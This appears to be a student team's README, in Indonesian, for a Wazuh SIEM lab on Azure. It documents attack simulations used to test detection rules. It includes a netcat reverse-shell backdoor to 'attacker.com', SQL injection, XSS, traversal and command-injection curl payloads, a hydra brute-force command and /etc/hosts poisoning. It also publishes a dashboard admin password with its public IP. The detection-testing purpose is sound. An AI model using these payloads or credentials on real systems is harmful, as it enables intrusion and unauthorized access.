# MIKS-C-K4

#### Nama Anggota
| No. | Nama                                    | NRP         | 
|-----|-----------------------------------------|-------------|
| 1   | Revalina Erica Permatasari              | 5027241007  | 
| 2   | Syifa Nurul Alfiah                      | 5027241019  | 
| 3   | Salsa Bil Ulla                          | 5027241052  | 
| 4   | Putri Joselina Silitonga                | 5027241116  | 

---

# Wazuh SIEM Project - Setup Guide

## 🔍 Overview

Project ini mengimplementasikan **Wazuh SIEM (Security Information and Event Management)** sebagai sistem monitoring keamanan jaringan berbasis cloud. Sistem dibangun dengan arsitektur **1 Manager + 4 Agent**, di-deploy di **Microsoft Azure for Students** dan diintegrasikan dengan **VirusTotal** untuk malware detection serta **Telegram Bot** untuk notifikasi real-time.

### Fitur Utama
- ✅ Real-time security event monitoring via Wazuh Dashboard
- ✅ File Integrity Monitoring (FIM) di semua agent
- ✅ Malware Detection via VirusTotal API integration
- ✅ Custom detection rules level 14–15 (Critical/High severity)
- ✅ Telegram Bot alert otomatis ke seluruh anggota tim
- ✅ SSH Brute Force detection dan logging
- ✅ Simulasi serangan: Brute Force, Web Attack, FIM, Rootkit, DDoS, Malware

---

## 🏗️ Arsitektur Sistem

```
┌─────────────────────────────────────────┐
│         CLOUD SERVER (Microsoft Azure)   │
│                                         │
│  ┌──────────────────────────────────┐   │
│  │       WAZUH MANAGER (AIO)        │   │
│  │                                  │   │
│  │  Wazuh Server   │  Wazuh Indexer │   │
│  │  Port: 1514/1515│  Port: 9200    │   │
│  │                                  │   │
│  │      Wazuh Dashboard             │   │
│  │      Port: 443 (HTTPS)           │   │
│  └──────────────────────────────────┘   │
│  Public IP: 70.153.19.42                │
└────────────────┬────────────────────────┘
                 │ TCP 1514/1515
     ┌───────────┼───────────┐
     ▼           ▼           ▼
┌─────────┐ ┌─────────┐ ┌─────────┐
│ Agent 1 │ │ Agent 2 │ │ Agent 3 │
│ macOS   │ │ Windows │ │ Kali    │
│ (kworung│ │(DESKTOP-│ │ Linux   │
│  /mac-  │ │8EBI1VU) │ │         │
│  agent) │ │         │ │         │
└─────────┘ └─────────┘ └─────────┘
```

### Komponen

| Komponen | Fungsi | Port |
|----------|--------|------|
| Wazuh Manager | Menerima & menganalisis log dari semua agent | 1514, 1515 |
| Wazuh Indexer | Database (OpenSearch) untuk menyimpan alert | 9200 |
| Wazuh Dashboard | Web UI untuk visualisasi & monitoring | 443 |
| Wazuh Agent | Mengumpulkan log di tiap laptop & kirim ke manager | — |

---

## 📁 Struktur Folder

```
wazuh-project/
├── README.md                    ← Panduan utama (file ini)
├── docs/
│   ├── architecture.md          ← Arsitektur & alur sistem lengkap
│   ├── setup-manager.md         ← Setup Wazuh Manager di Azure
│   ├── setup-agent.md           ← Setup Wazuh Agent di tiap laptop
│   ├── setup-malware.md         ← Setup Malware Detection + VirusTotal ⭐
│   └── attack-simulation.md     ← Panduan semua simulasi serangan
├── configs/
│   ├── manager/
│   │   └── ossec.conf           ← Konfigurasi manager (+ VirusTotal)
│   └── agent/
│       └── ossec.conf           ← Konfigurasi agent (FIM, log collection)
├── scripts/
│   ├── install-manager.sh       ← Auto-install Wazuh Manager di Azure
│   ├── install-agent.sh         ← Auto-install Wazuh Agent di laptop
│   ├── attack-bruteforce.sh     ← Simulasi SSH Brute Force
│   ├── attack-web.sh            ← Simulasi Web Attack (SQLi/XSS)
│   ├── attack-fim.sh            ← Simulasi File Integrity Monitoring
│   ├── attack-rootkit.sh        ← Simulasi Rootkit Detection
│   ├── attack-ddos.sh           ← Simulasi DDoS Attack
│   ├── attack-malware.sh        ← Simulasi Malware Detection ⭐
│   └── attack-service.bat       ← Simulasi suspicious service (Windows)
└── rules/
    └── custom-rules.xml         ← Custom detection rules level 10–15
```

---

## 🚀 Quick Start

### Prerequisites
- Akun Microsoft Azure for Students (email kampus `.ac.id`)
- Laptop dengan OS Windows/macOS/Linux/Kali
- Koneksi internet

### 1. Setup Manager (Azure)
Panduan lengkap: `docs/setup-manager.md`

```bash
# SSH ke server Azure
ssh wazuh-manager@70.153.19.42

# Jalankan auto-installer (sudah dilakukan)
sudo bash scripts/install-manager.sh
```

Akses Dashboard: `https://70.153.19.42`
- **User:** `admin`
- **Password:** `WazuhAdmin123*`

### 2. Setup Agent (Laptop)
Panduan lengkap: `docs/setup-agent.md`

**Linux/Kali:**
```bash
sudo bash scripts/install-agent.sh 70.153.19.42
```

**macOS:**
```bash
sudo launchctl setenv WAZUH_MANAGER "70.153.19.42" && \
sudo installer -pkg wazuh-agent.pkg -target /
sudo /Library/Ossec/bin/wazuh-control start
```

**Windows (PowerShell Admin):**
```powershell
wazuh-agent-4.9.2-1.msi /q WAZUH_MANAGER="70.153.19.42"
NET START WazuhSvc
```

### 3. Verifikasi Agent Terhubung
```bash
# Di server Azure
sudo /var/ossec/bin/agent_control -l
```

---

## 🦠 Malware Detection Module ⭐

Panduan lengkap: `docs/setup-malware.md`

Sistem menggunakan dua mekanisme malware detection:
1. **Rootcheck** — Deteksi rootkit berbasis signature (aktif bawaan)
2. **VirusTotal Integration** — File baru otomatis dicek ke VirusTotal API

### Validasi: EICAR Test File
```bash
# Jalankan di agent (Mac/Linux/Kali)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar-test.txt

# Atau jalankan script lengkap
bash scripts/attack-malware.sh
```

Lihat hasil di Dashboard: **Modules → Malware Detection** atau filter `rule.id: 87105`

---

## ⚔️ Simulasi Serangan

Panduan lengkap: `docs/attack-simulation.md`

| No | Skenario | Script | Rule ID | Level |
|----|----------|--------|---------|-------|
| 1 | SSH Brute Force | `attack-bruteforce.sh` | 5710, 5763 | 10–15 |
| 2 | Web Attack (SQLi/XSS) | `attack-web.sh` | 31103–31110 | 6–12 |
| 3 | File Integrity Monitoring | `attack-fim.sh` | 550–554 | 7–15 |
| 4 | Rootkit Detection | `attack-rootkit.sh` | 510–514 | 7–15 |
| 5 | DDoS Attack | `attack-ddos.sh` | 1002, 20101 | 6–15 |
| 6 | Malware Detection | `attack-malware.sh` | 87105 | 3–15 |
| 7 | Windows Service | `attack-service.bat` | 7036 | 5–10 |

### Cara Jalankan
```bash
# SSH Brute Force (dari Kali ke manager)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://70.153.19.42 -t 4

# Port Scan
nmap -sS -sV -A -T4 70.153.19.42

# Web Attack
bash scripts/attack-web.sh 70.153.19.42

# FIM Attack
sudo bash scripts/attack-fim.sh

# Rootkit
sudo bash scripts/attack-rootkit.sh

# DDoS
sudo bash scripts/attack-ddos.sh

# Malware
bash scripts/attack-malware.sh
```

---

## 🔔 Telegram Alert Integration

Sistem mengirim notifikasi otomatis ke Telegram saat ada alert. Bot: `@wazuhalertcoba_bot`

Notifikasi dikirim ke seluruh anggota tim setiap ada alert level ≥ 3, berjalan otomatis via cron job setiap 1 menit.

Format notifikasi:
```
🔴 WAZUH ALERT
🕐 17/05/2026 15:30:00 WIB
📊 Level: 15
🔢 Rule: 100003
💻 Agent: mac-agent
📝 CRITICAL: SSH brute force attack detected
```

---

## 📋 Custom Detection Rules

File: `rules/custom-rules.xml` dan `/var/ossec/etc/rules/local_rules.xml`

| Rule ID | Level | Deskripsi |
|---------|-------|-----------|
| 100001 | 15 | CRITICAL: File modified in monitored directory |
| 100002 | 15 | CRITICAL: New suspicious file created |
| 100003 | 15 | CRITICAL: SSH brute force attack detected |
| 100004 | 15 | CRITICAL: Multiple SSH authentication failures |
| 100005 | 15 | CRITICAL: Port scan detected |
| 100006 | 15 | CRITICAL: VirusTotal malware detected |
| 100007 | 15 | CRITICAL: Rootkit detected |
| 100008 | 15 | CRITICAL: Possible privilege escalation |
| 100009 | 15 | CRITICAL: Web attack attempt |
| 100010 | 15 | CRITICAL: Suspicious process execution |
| 100011 | 15 | CRITICAL: Possible DoS attack |
| 100012 | 14 | HIGH: Login outside business hours |
| 100013 | 14 | HIGH: Multiple failures then success |
| 100070 | 15 | CRITICAL: Massive FIM violations - Possible ransomware |
| 100071 | 14 | CRITICAL: Sensitive file modified |

---

## 🖥️ Demo Presentasi

Urutan demo yang disarankan (30 menit):

| Waktu | Aktivitas | Command |
|-------|-----------|---------|
| 0–5 min | Tunjukkan dashboard & agent status | Buka `https://70.153.19.42` |
| 5–10 min | Cek service & agent aktif | `sudo /var/ossec/bin/agent_control -l` |
| 10–15 min | Jalankan SSH Brute Force (Kali) | `hydra -l root -P rockyou.txt ssh://70.153.19.42` |
| 15–20 min | Monitor alert real-time | `tail -f /var/ossec/logs/alerts/alerts.log` |
| 20–25 min | Tunjukkan Telegram notif | Lihat HP |
| 25–30 min | Tunjukkan custom rules & VirusTotal | `cat /var/ossec/etc/rules/local_rules.xml` |

### Command Demo Manager
```bash
# 1. Status semua service
sudo systemctl status wazuh-manager wazuh-indexer wazuh-dashboard --no-pager | grep Active

# 2. Daftar agent
sudo /var/ossec/bin/agent_control -l

# 3. Monitor alert real-time
sudo tail -f /var/ossec/logs/alerts/alerts.log

# 4. Cek custom rules
cat /var/ossec/etc/rules/local_rules.xml

# 5. Cek disk aman
df -h /

# 6. Kirim test Telegram
python3 /usr/local/bin/wazuh-telegram.py
```

---

## 🔧 Troubleshooting

### Manager tidak bisa start
```bash
# Cek disk
df -h /

# Hapus tmp vulnerability database jika penuh
sudo find /var/ossec/queue/vd_updater/tmp -type f -delete
sudo systemctl restart wazuh-manager
```

### Agent tidak connect
```bash
# Cek log agent
sudo tail -20 /var/ossec/logs/ossec.log

# Re-enroll agent
sudo /var/ossec/bin/manage_agents  # pilih A (add)
sudo cat /var/ossec/etc/client.keys
```

### Dashboard "No API available"
```bash
# Restart semua service
sudo systemctl restart wazuh-indexer
sudo systemctl restart wazuh-manager
sudo systemctl restart wazuh-dashboard
```

### Telegram tidak masuk
```bash
# Test manual
python3 /usr/local/bin/wazuh-telegram.py

# Cek cron
crontab -l
```

---

## 📊 Status Sistem Saat Ini

| Komponen | Status |
|----------|--------|
| Wazuh Manager | ✅ Running |
| Wazuh Indexer | ✅ Running |
| Wazuh Dashboard | ✅ Running (`https://70.153.19.42`) |
| Agent mac-agent (ID 003) | ✅ Active |
| Agent DESKTOP-8EBI1VU (ID 004) | ✅ Active |
| VirusTotal Integration | ✅ Active |
| Telegram Bot Alert | ✅ Active (cron setiap 1 menit) |
| Custom Rules Level 15 | ✅ Active (15 rules) |
| Disk Usage | ✅ ~19% (aman) |

---

## 📚 Dokumentasi Lengkap

| File | Isi |
|------|-----|
| `docs/architecture.md` | Arsitektur sistem, data flow, topologi jaringan |
| `docs/setup-manager.md` | Panduan setup Azure VM & install Wazuh Manager |
| `docs/setup-agent.md` | Panduan install agent Windows/macOS/Linux |
| `docs/setup-malware.md` | Setup VirusTotal integration & validasi malware |
| `docs/attack-simulation.md` | Semua skenario serangan & cara cek di dashboard |


## 3. SSH Brute Force Attack

### Deskripsi

SSH Brute Force adalah teknik serangan di mana penyerang mencoba login ke server SSH menggunakan banyak kombinasi username dan password secara berulang dalam waktu singkat. Wazuh mendeteksi pola ini melalui analisis log autentikasi (`/var/log/auth.log`) dan memicu alert berdasarkan frekuensi kegagalan login.

### Tujuan Simulasi

Membuktikan bahwa Wazuh mampu mendeteksi percobaan login yang gagal secara masif, mengidentifikasi IP sumber serangan, dan memicu alert pada rule level yang sesuai.

### Script Simulasi

Script `attack-bruteforce.sh` menjalankan tiga metode simulasi secara berurutan:

**Metode 1 — Failed SSH login menggunakan logger (15 percobaan):**
```bash
for i in $(seq 1 15); do
    logger -p auth.warning \
        "sshd[$$]: Failed password for invalid user hacker_${i} \
        from 10.10.10.${i} port $((2000+i)) ssh2"
    sleep 0.3
done
```

**Metode 2 — Brute force multiple username:**
```bash
USERS=("admin" "root" "test" "user" "ubuntu" "mysql" "postgres")
for user in "${USERS[@]}"; do
    logger -p auth.warning \
        "sshd[$$]: Failed password for ${user} from 192.168.1.100 port 22 ssh2"
    sleep 0.3
done
```

**Metode 3 — Rapid-fire untuk memicu alert level tinggi (30 percobaan cepat):**
```bash
sudo bash -c 'for i in $(seq 1 50); do
  echo "$(date "+%b %d %T") kworung sshd[$$]: Failed password for invalid user attacker \
  from 10.0.0.$((RANDOM%255)) port $((3000+i)) ssh2" >> /var/log/auth.log
  sleep 0.1
done'
```

Metode ketiga menginject entri log autentikasi langsung ke `/var/log/auth.log` dengan simulasi IP sumber acak (`10.0.0.x`) untuk merepresentasikan serangan brute force dari berbagai host.

### Rule yang Terpicu

| Rule ID | Deskripsi | Level |
|---------|-----------|-------|
| 5710 | Attempt to login using a non-existent user | 5 |
| 5712 | Multiple authentication failures | 10 |
| 5763 | SSH brute force attack detected | 12 |

### Hasil Deteksi di Wazuh Dashboard

![bruteforce] (Documentation/111.jpeg)

> Keterangan: Threat Hunting Dashboard menampilkan 943 hits dari agent `kworung`. Setiap baris menunjukkan event dengan `rule.id: 5710` (SSH attempt to login using non-existent user) dengan rule level 5, timestamped pada May 18, 2026 pukul 23:38.

Pada Wazuh Dashboard, filter yang digunakan:
```
rule.id: 5710 OR rule.id: 5712 OR rule.id: 5763
agent.name: kworung
```

Detail setiap event menunjukkan field-field berikut:
- `data.srcuser: attacker` — username yang digunakan oleh penyerang
- `data.srcip: 10.0.0.x` — IP sumber serangan yang bervariasi (simulasi distributed attack)
- `rule.groups: syslog, sshd, authentication_failed, invalid_login`
- Compliance mapping: `rule.pci_dss: 10.2.4, 10.2.5`, `rule.hipaa: 164.312.b`, `rule.gdpr: IV_35.7.d`

---

## 4. Malware Detection

### Deskripsi

Modul Malware Detection pada Wazuh bekerja dengan mengintegrasikan pemeriksaan file terhadap database VirusTotal, mendeteksi file EICAR (standar uji antivirus internasional), serta mengidentifikasi pola perilaku mencurigakan yang lazim ditemukan pada malware seperti C2 beacon, cryptominer, dan hidden backdoor.

### Tujuan Simulasi

Memvalidasi bahwa integrasi VirusTotal dan modul rootcheck Wazuh dapat mendeteksi keberadaan file berbahaya dan aktivitas mencurigakan di sistem agent.

### Script Simulasi

Script `attack-malware.sh` menjalankan empat langkah simulasi:

**Step 1 — Membuat EICAR Test File (standar uji antivirus internasional):**
```bash
cd ~/Downloads/wazuh-project/wazuh-project/scripts
bash attack-malware.sh
```

Script secara internal membuat file EICAR di `/tmp/eicar-malware-test.txt`. EICAR adalah string khusus yang diakui oleh seluruh vendor antivirus sebagai penanda file berbahaya tanpa mengandung kode berbahaya sesungguhnya — aman 100% untuk pengujian.

**Step 2 — Membuat file mencurigakan (indikator rootkit):**

File-file berikut dibuat di direktori `/tmp` dengan nama tersembunyi (diawali titik) yang merupakan pola umum malware:
- `/tmp/.hidden_payload_demo`
- `/tmp/.c2_beacon_demo`
- `/tmp/.backdoor_demo.sh` (berisi simulasi reverse shell ke `192.168.1.100:4444`)

**Step 3 — Injeksi entri log aktivitas malware:**
```bash
for i in $(seq 1 5); do
    logger -p user.warning "MALWARE_DEMO: Suspicious process spawn detected - /tmp/.backdoor_demo.sh"
    logger -p user.warning "MALWARE_DEMO: Outbound connection attempt to 192.168.1.100:4444"
    logger -p user.warning "MALWARE_DEMO: Hidden file detected in /tmp - possible C2 beacon"
    sleep 1
done
```

**Step 4 — Simulasi pola cryptominer:**
```bash
for i in $(seq 1 3); do
    logger -p user.warning "MALWARE_DEMO: High CPU process detected - possible cryptominer"
    logger -p user.warning "MALWARE_DEMO: Connection to mining pool: pool.demo-miner.com:3333"
    sleep 1
done
```

### Keluaran Eksekusi Script

![malware] (Documentation/malware.jpeg)
> Keterangan: Output terminal saat `bash attack-malware.sh` dijalankan. Menampilkan empat langkah simulasi (EICAR file creation, suspicious files, syslog injection, crypto miner simulation) yang semuanya selesai dengan status [DONE].

### Hasil Deteksi di Wazuh Dashboard

![malware] (Documentation/malwareout.jpeg)
> Keterangan: Threat Hunting Dashboard menampilkan 34 hits pada rentang waktu May 18–19, 2026. Alert dari beberapa agent (Ascala, DESKTOP-8EBI1VU, kworung) dengan rule level 7 dan rule ID 510. Deskripsi meliputi "Trojaned version of file detected", "NTFS Alternate data stream found", dan "Process hidden from kill command" — semua termasuk kategori host-based anomaly detection.

Filter dashboard yang digunakan:
```
rule.groups: rootcheck
agent.name: kworung
```

---

## 5. Web Attack — SQL Injection & XSS

### Deskripsi

Serangan web seperti SQL Injection (SQLi) dan Cross-Site Scripting (XSS) merupakan dua jenis serangan aplikasi web yang paling umum (masuk dalam OWASP Top 10). SQLi bertujuan memanipulasi query database, sementara XSS menyisipkan skrip berbahaya ke dalam halaman web. Wazuh mendeteksi serangan ini melalui analisis log Apache/Nginx.

### Tujuan Simulasi

Membuktikan bahwa Wazuh mampu mengidentifikasi payload serangan web dari log akses HTTP dan memicu alert yang sesuai tanpa memerlukan sistem IDS terpisah.

### Script Simulasi

```bash
cd ~/Downloads/wazuh-project/wazuh-project/scripts
bash attack-web.sh localhost
```

Script `attack-web.sh` menjalankan empat kategori serangan:

**1. SQL Injection (10 payload):**
```bash
curl "http://localhost/index.html?id=1' OR '1'='1"
curl "http://localhost/login?user=admin'--"
curl "http://localhost/search?q=1 UNION SELECT * FROM users--"
curl "http://localhost/page?id=1; DROP TABLE users;--"
curl "http://localhost/api?param=' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--"
# ... dan 5 payload lainnya
```

**2. XSS — Cross-Site Scripting (8 payload):**
```bash
curl "http://localhost/search?q=<script>alert('XSS')</script>"
curl "http://localhost/page?name=<img src=x onerror=alert(1)>"
curl "http://localhost/comment?text=<svg/onload=alert('hacked')>"
# ... dan 5 payload lainnya
```

**3. Directory Traversal (6 payload):**
```bash
curl "http://localhost/page?file=../../../etc/passwd"
curl "http://localhost/download?path=....//....//etc/shadow"
curl "http://localhost/include?page=..%2F..%2F..%2Fetc%2Fpasswd"
# ... dan 3 payload lainnya
```

**4. Command Injection (5 payload):**
```bash
curl "http://localhost/exec?cmd=;cat /etc/passwd"
curl "http://localhost/ping?host=;id"
curl "http://localhost/shell?input=\$(cat /etc/shadow)"
# ... dan 2 payload lainnya
```

### Keluaran Eksekusi Script

![sql](sql.jpeg)
> Keterangan: Output terminal menampilkan eksekusi `bash attack-web.sh localhost`. Terlihat daftar payload SQL Injection yang dikirimkan ke `http://localhost`, diikuti XSS payload. Script melaporkan "10 SQL injection attempts sent" dan dua XSS attempt yang terlihat di output.

### Rule yang Terpicu

| Rule ID | Deskripsi | Level |
|---------|-----------|-------|
| 31103 | SQL injection attempt | 6 |
| 31104 | XSS (Cross-Site Scripting) attempt | 6 |
| 31105 | Directory traversal attempt | 6 |
| 31110 | Multiple web attack patterns | 10 |

![sqlout](sqlout.jpeg)
---


## 6. Privilege Escalation

### Deskripsi

Privilege Escalation adalah serangan di mana penyerang yang sudah memiliki akses ke sistem dengan hak terbatas berusaha mendapatkan hak superuser (root). Wazuh mendeteksi pola ini melalui log autentikasi `sudo` dan `su` di `/var/log/auth.log`.

### Tujuan Simulasi

Membuktikan bahwa Wazuh dapat mendeteksi percobaan eskalasi hak akses yang berulang dan memicu alert pada threshold yang telah dikonfigurasi.

### Script Simulasi

```bash
sudo bash -c 'for i in $(seq 1 20); do
  echo "$(date "+%b %d %T") kworung sudo: auth failure; logname=hacker uid=1000 \
  euid=0 tty=/dev/pts/0 ruser=hacker rhost= user=root" >> /var/log/auth.log
  echo "$(date "+%b %d %T") kworung su[$$]: BAD SU hacker to root on /dev/pts/0" \
  >> /var/log/auth.log
  sleep 0.2
done'
```

Script ini menyimulasikan 20 iterasi yang masing-masing menginjeksikan dua entri log:
1. Kegagalan autentikasi `sudo` oleh user `hacker` yang mencoba mendapatkan hak `root`
2. Kegagalan perintah `su` dari `hacker` ke `root`

Entri log menggunakan format syslog standar dengan field `uid=1000 euid=0`, yang merupakan indikator bahwa user non-root mencoba mengeksekusi perintah dengan privilege root.

![alt text](priv.jpeg)
> Keterangan: Output terminal menampilkan eksekusi loop privilege escalation. Field `logname=hacker uid=1000 euid=0` terlihat jelas pada output, menunjukkan simulasi upaya akses root oleh user biasa.

### Hasil Deteksi di Wazuh Dashboard

![alt text](privout.jpeg) 
> Keterangan: Wazuh Dashboard menampilkan serangkaian alert dengan rule level 9 dan deskripsi "User missed the password to change UID to root" dari agent `kworung`. Field `data.srcuser: hacker` dan `data.dstuser: root` terlihat pada detail event. Nilai `rule.firedtimes` yang terus meningkat (36, 37, 38, 39, 40) menunjukkan bahwa Wazuh melacak frekuensi kejadian secara kumulatif.

Filter dashboard yang digunakan:
```
rule.id: 5401 OR rule.id: 5404
agent.name: kworung
```

### Rule yang Terpicu

| Rule ID | Deskripsi | Level |
|---------|-----------|-------|
| 5401 | Unsuccessful sudo command | 5 |
| 5404 | 3+ consecutive sudo failures | 9 |
| 5301 | su session failed | 5 |

---

## 7. File Integrity Monitoring (FIM)

### Deskripsi

File Integrity Monitoring (FIM) adalah mekanisme deteksi yang memantau perubahan pada file dan direktori sensitif di sistem. Wazuh mengimplementasikan FIM melalui modul `syscheck` yang melakukan pemeriksaan checksum secara berkala maupun real-time. Setiap perubahan — baik penambahan, modifikasi, penghapusan, maupun perubahan permission — akan menghasilkan alert.

### Tujuan Simulasi

Membuktikan bahwa Wazuh dapat mendeteksi aktivitas manipulasi file yang merupakan indikasi keberadaan penyerang dalam sistem, termasuk pembuatan backdoor dan keylogger.

### Script Simulasi

```bash
cd ~/Downloads/wazuh-project/wazuh-project/scripts
sudo bash attack-fim.sh
```

Script `attack-fim.sh` mensimulasikan enam tahap serangan terhadap integritas file:

**Tahap 1 — Pembuatan file sensitif:**
```bash
echo "DATABASE_URL=mysql://admin:password123@localhost:3306/production" \
    > /tmp/fim-test/database.env
echo "API_KEY=sk-live-1234567890abcdef" > /tmp/fim-test/api-keys.txt
echo "AWS_SECRET=AKIAIOSFODNN7EXAMPLE" > /tmp/fim-test/aws-credentials.txt
```

**Tahap 2 — Modifikasi file (simulasi tamper oleh penyerang):**
```bash
echo "DATABASE_URL=mysql://hacker:pwned@evil-server.com:3306/stolen" \
    > /tmp/fim-test/database.env
echo "API_KEY=sk-live-STOLEN_BY_ATTACKER" > /tmp/fim-test/api-keys.txt
```

**Tahap 3 — Perubahan permission (pelemahan keamanan):**
```bash
chmod 777 /tmp/fim-test/database.env
chmod 777 /tmp/fim-test/api-keys.txt
chown nobody:nogroup /tmp/fim-test/aws-credentials.txt
```

**Tahap 4 — Penghapusan file (menghapus jejak):**
```bash
rm -f /tmp/fim-test/aws-credentials.txt
```

**Tahap 5 — Modifikasi `/etc/hosts` (simulasi DNS hijacking):**
```bash
echo "10.10.10.10 google.com" >> /etc/hosts
echo "10.10.10.10 facebook.com" >> /etc/hosts
echo "10.10.10.10 bank.com" >> /etc/hosts
```

**Tahap 6 — Pembuatan script berbahaya:**
```bash
# Simulated backdoor
cat > /tmp/fim-test/backdoor.sh << 'SCRIPT'
#!/bin/bash
while true; do
    nc -e /bin/bash attacker.com 4444 2>/dev/null
    sleep 60
done
SCRIPT
chmod +x /tmp/fim-test/backdoor.sh

# Simulated keylogger (tidak fungsional, hanya untuk deteksi FIM)
cat > /tmp/fim-test/keylogger.py << 'SCRIPT'
#!/usr/bin/env python3
print("This is a simulated keylogger for demo purposes only")
SCRIPT
chmod +x /tmp/fim-test/keylogger.py
```

### Hasil Deteksi di Wazuh Dashboard

![alt text](fileout.jpeg) 
> Keterangan: Wazuh FIM Dashboard menampilkan daftar perubahan file dari agent `DESKTOP-8EBI1VU`. Field `syscheck.path` menunjukkan file-file yang berubah seperti `/tmp/fim-test/keylogger.py`, `/tmp/fim-test/backdoor.sh`, `/tmp/fim-test/aws-credentials.txt`, dan `/etc/hosts`. Kolom `syscheck.event` memperlihatkan jenis perubahan: `modified`, `deleted`, `added`. Rule ID yang terpicu antara lain 550 (integrity checksum changed), 553 (file deleted), dan 554 (file added).

Filter dashboard yang digunakan:
```
rule.groups: syscheck
agent.name: DESKTOP-8EBI1VU
```

### Rule yang Terpicu

| Rule ID | Deskripsi | Level |
|---------|-----------|-------|
| 554 | File added to monitored directory | 5 |
| 550 | Integrity checksum changed | 7 |
| 553 | File deleted from monitored directory | 7 |

---

## 8. VirusTotal Integration

### Deskripsi

Wazuh mengintegrasikan API VirusTotal untuk melakukan pemeriksaan hash file terhadap database ancaman global. Setiap file yang baru muncul di direktori yang dimonitor oleh FIM akan secara otomatis dilakukan hash lookup ke VirusTotal. Hasilnya ditampilkan sebagai alert jika file tidak ditemukan dalam database (berpotensi merupakan malware baru/custom) maupun jika file terdeteksi sebagai berbahaya.

### Hasil Deteksi di Wazuh Dashboard

![alt text](virtout.jpeg)

> Keterangan: Threat Hunting Dashboard menampilkan alert VirusTotal dari agent `kworung`. Baris-baris dengan rule ID `87104` menampilkan deskripsi seperti "VirusTotal: Alert - /usr/bin/topsysproc" dan "VirusTotal: Alert - /usr/bin/priclass.d" dengan rule level 3. Baris dengan rule ID `87103` menampilkan "VirusTotal: Alert - No records in VirusTotal" yang mengindikasikan file tidak ada dalam database VirusTotal (potensi custom malware atau file baru yang belum terindeks).

![alt text](tambahan.jpeg)
> Keterangan: Tampilan halaman 63 dari hasil Threat Hunting (total 943 hits). Menampilkan alert `rule.id: 19009` dengan deskripsi "System audit for Unix based systems" dari agent `kworung` pada May 17, 2026, serta alert `rule.id: 501` "New wazuh agent connected" yang menunjukkan koneksi agent baru ke Manager.

### Interpretasi Hasil VirusTotal

- **Rule ID 87104** — File terdeteksi atau dilaporkan di VirusTotal. Level 3 karena merupakan informasi, bukan konfirmasi ancaman.
- **Rule ID 87103** — File tidak ditemukan di database VirusTotal. Kondisi ini perlu investigasi lebih lanjut karena file custom (malware baru) biasanya tidak terindeks.
- Seluruh binary di `/usr/bin/` yang dipindai merupakan bagian dari pemeriksaan rutin `rootcheck` yang diintegrasikan dengan VirusTotal.
